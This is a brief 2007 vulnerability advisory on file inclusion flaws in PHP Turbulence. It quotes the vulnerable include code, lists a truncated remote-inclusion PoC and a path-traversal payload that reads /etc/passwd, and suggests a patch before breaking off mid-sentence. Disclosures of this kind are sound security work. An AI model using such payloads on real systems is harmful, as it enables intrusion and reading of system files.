---------
Date : 2007-04-20

Vendor : http://sourceforge.net/projects/turbulence
Vendor Status : 2007-04-20 -> Not Informed!
2007-04-21 -> Vendor Informed!
Description : PHP Turbulence is a suite of PHP scripts that work together in unison. They do not require one another

--- [ Remote File Inclusion Vulnerability ] ---
===============================================
[ /user/turbolence.php - Line 34 - 39 ]
[...]
$tdbconn = tdb\_connect($GLOBALS['tdb']);
if (!$tdbconn) decho("Database Connection Failed...");
decho("Database Connection: ".$tdbconn);
include($GLOBALS['tcore'].'/user/session.inc');
if ($GLOBALS['login']) {
[...]
[ end script turbolence.php ]
As you can see the variable $GLOBALS['tcode'] is not properly sanitized before being used; so an attacker can gain access
to the shell by using a crafted URL.
--- [ PoC ] ---
===============
Tested on a php.ini configuration as the follow:
register\_global = On
allow\_url\_unclude = On
RFI:

l\_script.txt?
LFI:

./../../../etc/passwd%00
---- [ Patch ] ----
1. Edit the source code to ensure that the input is validated.
2. To avoid Remote File Inclusion turn Off allow\_url\_include.

Since the tdb_connect function doesn't exist in the script (or
